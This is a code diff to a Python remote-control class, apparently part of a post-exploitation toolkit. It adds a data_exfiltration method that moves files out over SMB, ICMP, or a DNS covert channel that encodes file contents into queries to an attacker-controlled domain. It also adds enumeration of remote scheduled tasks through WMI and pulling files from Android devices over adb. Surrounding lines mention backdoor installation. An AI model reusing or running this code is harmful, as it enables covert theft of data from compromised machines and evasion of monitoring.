@@ -1969,7 +1969,54 @@ class AgentlessControl:
             logger.error(f"[EXFIL-DNS] Failed: {e}")
             return False
 
-    
+    def data_exfiltration(self, ip: str, local_path: str, method: str = "smb", user: str = "", pwd: str = "", domain: str = "") -> dict:
+        """
+        Exfiltrate data using specified covert channel.
+        For 'smb': uploads local file to target's C$ share.
+        For 'icmp': sends local file to target via ICMP echo requests.
+        For 'dns': encodes file and sends via DNS queries (ip parameter is used as DNS domain suffix).
+        """
+        logger.info(f"[DATA-EXFIL] Exfiltrating to {ip} via {method}")
+        result = {"success": False, "method": method, "target": ip}
+        if not os.path.exists(local_path):
+            result["error"] = "Local file not found"
+            return result
+        try:
+            if method == "smb":
+                remote_name = os.path.basename(local_path)
+                success = self.smb_upload(ip, local_path, "C$", remote_name, user, pwd)
+                result["success"] = success
+                result["remote_path"] = f"\\\\{ip}\\C$\\{remote_name}"
+            elif method == "icmp":
+                success = self.exfiltrate_icmp(ip, local_path)
+                result["success"] = success
+            elif method == "dns":
+                # DNS covert channel exfiltration: send file data via DNS TXT queries to attacker-controlled domain
+                dns_domain = ip  # repurposed as DNS domain suffix
+                with open(local_path, 'rb') as f:
+                    data_bytes = f.read()
+                import base64
+                data_str = base64.b64encode(data_bytes).decode('utf-8')
+                # Split into chunks and send DNS queries
+                chunks = [data_str[i:i+50] for i in range(0, len(data_str), 50)]
+                for chunk in chunks:
+                    query = f"{chunk}.{dns_domain}"
+                    try:
+                        import socket
+                        socket.getaddrinfo(query, None)
+                    except:
+                        pass
+                logger.info(f"[DATA-EXFIL-DNS] Sent {len(chunks)} queries to domain {dns_domain}")
+                result["success"] = True
+                result["dns_domain"] = dns_domain
+                result["chunks_sent"] = len(chunks)
+            else:
+                result["error"] = f"Unsupported method: {method}"
+        except Exception as e:
+            result["error"] = str(e)
+            logger.error(f"[DATA-EXFIL] {ip}: {e}")
+        return result
+
     def establish_persistent_connection(self, ip: str, username: str, password: str, domain: str = "") -> dict:
         """
         FULL PERSISTENT CONNECTION - Backdoor installation
@@ -2397,6 +2444,33 @@ class AgentlessControl:
         ok = result.get("return_code") == 0
         logger.info(f"[SCHEDTASK] {ip}: {'OK' if ok else 'FAILED'}")
         return ok
+
+    def list_scheduled_tasks(self, ip: str, user: str, pwd: str, domain: str = "") -> List[Dict[str, Any]]:
+        """
+        List scheduled tasks on remote Windows host.
+        Uses schtasks /query and parses output.
+        Returns list of task dicts with TaskName and Status.
+        """
+        logger.info(f"[TASKS] Listing scheduled tasks on {ip}")
+        cmd = "schtasks /query /fo LIST /v"
+        result = self.wmi_exec(ip, user, pwd, cmd, domain, wait_timeout=30)
+        output = result.get("output", "")
+        tasks = []
+        current = {}
+        for line in output.splitlines():
+            line = line.strip()
+            if not line:
+                if current:
+                    tasks.append(current)
+                    current = {}
+                continue
+            if ':' in line:
+                key, _, val = line.partition(':')
+                current[key.strip()] = val.strip()
+        if current:
+            tasks.append(current)
+        logger.info(f"[TASKS] Found {len(tasks)} scheduled tasks on {ip}")
+        return tasks
 
     def download_file_from_url(self, ip: str, user: str, pwd: str, url: str, save_path: str, domain: str = "") -> bool:
         """
@@ -3841,6 +3915,11 @@ class AgentlessControl:
     def adb_push(self, ip: str, local: str, remote: str, port: int = 5555) -> bool:
         """Push file to Android host."""
         r = self._adb(["push", local, remote], device=f"{ip}:{port}")
+        return r.returncode == 0
+
+    def adb_pull(self, ip: str, remote: str, local: str, port: int = 5555) -> bool:
+        """Pull file from Android host."""
+        r = self._adb(["pull", remote, local], device=f"{ip}:{port}")
         return r.returncode == 0
 
     def stream_screen_fast(self, ip: str, user: str, pwd: str, count: int = 10, interval: float = 0.5, domain: str = ""):
